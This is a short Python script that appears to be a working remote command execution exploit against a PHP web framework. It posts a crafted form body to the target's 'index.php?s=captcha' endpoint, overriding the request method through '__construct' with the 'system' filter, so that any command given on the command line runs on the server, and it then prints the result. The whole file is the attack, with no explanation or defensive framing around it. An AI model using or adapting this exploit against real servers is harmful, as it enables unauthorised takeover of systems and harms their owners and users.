import requests
import sys

if len(sys.argv) != 3:
    print(f"Usage: python {sys.argv[0]} <url> <command>")
    sys.exit(1)

url = sys.argv[1]
command = sys.argv[2]
payload = {
    "_method": "__construct",
    "filter[]": "system",
    "method": "get",
    "server[REQUEST_METHOD]": command
}
res = requests.post(url=url+"/index.php?s=captcha", data=payload)

print(res.text)